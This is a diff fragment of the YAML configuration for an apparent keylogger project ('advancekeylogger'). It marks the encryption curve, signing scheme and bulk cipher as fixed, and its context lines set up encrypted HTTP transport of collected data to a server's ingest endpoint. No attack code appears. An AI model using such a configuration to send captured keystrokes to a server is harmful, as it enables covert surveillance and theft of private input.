@@ -92,9 +92,9 @@ encryption:
   # then set transport.method to "http" and transport.http.url to
   # "http://<server-host>:8000/ingest".
   e2e:
-    curve: "curve25519"
-    signing: "ed25519"
-    bulk_cipher: "aes-256-gcm"
+    curve: "curve25519"           # fixed — not configurable
+    signing: "ed25519"            # fixed — not configurable
+    bulk_cipher: "aes-256-gcm"    # fixed — not configurable
     key_rotation_hours: 24
     key_store_path: "~/.advancekeylogger/keys/"
     server_public_key: ""   # base64-encoded X25519 public key from server
